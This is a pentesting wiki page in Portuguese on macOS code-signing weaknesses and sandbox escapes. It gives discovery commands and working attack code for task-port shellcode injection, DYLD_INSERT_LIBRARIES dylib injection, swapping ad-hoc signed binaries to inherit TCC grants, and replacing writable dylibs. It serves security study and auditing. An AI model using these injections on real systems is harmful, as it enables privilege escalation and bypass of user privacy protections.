# macOS Code Signing Weaknesses & Sandbox Escapes

{{#include ../../../banners/hacktricks-training.md}}

## Ad-Hoc Signed Binaries

### Informações Básicas

**Ad-hoc signing** (`CS_ADHOC`) cria uma assinatura de código com **nenhuma cadeia de certificados** — é um hash do código sem verificação de identidade do desenvolvedor. A origem do binário não pode ser rastreada até nenhum desenvolvedor ou organização.

Em Apple Silicon Macs, todos os executáveis requerem no mínimo uma assinatura ad-hoc. Isso significa que você encontrará assinaturas ad-hoc em muitas ferramentas de desenvolvimento, pacotes Homebrew e utilitários de terceiros.

### Por que isso importa

- **Sem identidade verificável** — o binário pode ser substituído sem detecção por verificações baseadas em identidade
- Binários ad-hoc de terceiros em **posições privilegiadas** (FDA, daemon, helpers) são alvos de alta prioridade
- Em algumas configurações, assinaturas ad-hoc podem **não ser verificadas tão rigorosamente** quanto código assinado por desenvolvedor
- Binários assinados ad-hoc que têm **TCC grants** são especialmente valiosos — as permissões persistem mesmo se o conteúdo do binário mudar (depende de como o TCC associou a permissão)

### Descoberta
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### Ataque: Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. On next launch, the daemon runs your code with the original's TCC grants
# (This works when TCC keyed the grant by path rather than code signature)
```
---

## Processos Depuráveis (get-task-allow)

### Informações Básicas

O **`com.apple.security.get-task-allow`** entitlement (ou `CS_GET_TASK_ALLOW` flag) permite que **qualquer processo se anexe como depurador**, lendo memória, modificando registradores, injetando código e controlando a execução.

Isso se destina **apenas a builds de desenvolvimento**. No entanto, alguns binários de terceiros são distribuídos com esse entitlement em produção.

> [!CAUTION]
> Um binário de produção com `get-task-allow` é uma **primitiva de exploração instantânea**. Qualquer processo local pode chamar `task_for_pid()`, obter o Mach task port do alvo, e injetar código arbitrário que é executado com os entitlements do alvo, permissões TCC e contexto de segurança.

### Descoberta
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### Ataque: Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## No Library Validation + DYLD Environment

### A Combinação Mortal

Quando um binário tem **ambos**:
- `com.apple.security.cs.disable-library-validation` (carrega qualquer dylib)
- `com.apple.security.cs.allow-dyld-environment-variables` (aceita variáveis de ambiente DYLD)

Isto é um **guaranteed code injection primitive** — `DYLD_INSERT_LIBRARIES` funciona perfeitamente.

### Descoberta
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### Ataque: DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Exceções Temporárias do Sandbox

### Como Elas Enfraquecem o Sandbox

As exceções temporárias do Sandbox (`com.apple.security.temporary-exception.*`) abrem brechas no App Sandbox:

| Exceção | O que permite |
|---|---|
| `temporary-exception.mach-lookup.global-name` | Conectar-se a serviços XPC/Mach de todo o sistema |
| `temporary-exception.files.absolute-path.read-write` | Ler/gravar arquivos fora do container do app |
| `temporary-exception.iokit-user-client-class` | Abrir conexões user-client do IOKit |
| `temporary-exception.shared-preference.read-only` | Ler preferências de outros apps |
| `temporary-exception.files.home-relative-path.read-write` | Acessar caminhos relativos a `~` |

### Mach-Lookup Exceptions = Sandbox Escape Primitive

A exceção mais perigosa é **mach-lookup** — ela permite que um app em sandbox converse com daemons privilegiados:
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### Ataque: Sandbox Escape via Mach-Lookup
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## Entitlements Privadas da Apple

### O que são

Entitlements com prefixo `com.apple.private.*` fornecem acesso a **APIs internas da Apple** que não estão documentadas ou disponíveis para desenvolvedores de terceiros. Binários de terceiros com entitlements privadas as obtiveram através de enterprise cert, MDM ou distribuição fora da App Store.

### Entitlements Privadas Perigosas

| Entitlement | Capacidade |
|---|---|
| `com.apple.private.tcc.manager` | Leitura/gravação completa do banco de dados TCC |
| `com.apple.private.tcc.allow` | Acesso a serviços TCC específicos |
| `com.apple.private.security.no-sandbox` | Executar sem sandbox |
| `com.apple.private.iokit` | Acesso direto a drivers IOKit |
| `com.apple.private.kernel.\*` | Acesso à interface do Kernel |
| `com.apple.private.xpc.launchd.job-label` | Registrar/gerenciar jobs do launchd |
| `com.apple.rootless.install` | Gravar em caminhos protegidos pelo SIP |

### Descoberta
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## Perfis de Sandbox Personalizados (SBPL)

### O que São

Binários podem vir com **perfis de sandbox personalizados** escritos em SBPL (Seatbelt Profile Language). Esses perfis podem ser mais restritivos OU **mais permissivos** do que o App Sandbox padrão.

### Auditoria de Perfis Personalizados
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## Caminhos de Bibliotecas Graváveis

### O que são

Quando um binário carrega uma biblioteca dinâmica a partir de um caminho que o usuário atual pode **escrever em**, a biblioteca pode ser substituída por código malicioso.

### Descoberta
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### Ataque: Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## Referências

* [Apple Developer — Code Signing Guide](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
* [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
* [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
* [The Evil Bit — clear-library-validation](https://theevilbit.github.io/posts/com.apple.private.security.clear-library.validation/)

{{#include ../../../banners/hacktricks-training.md}}
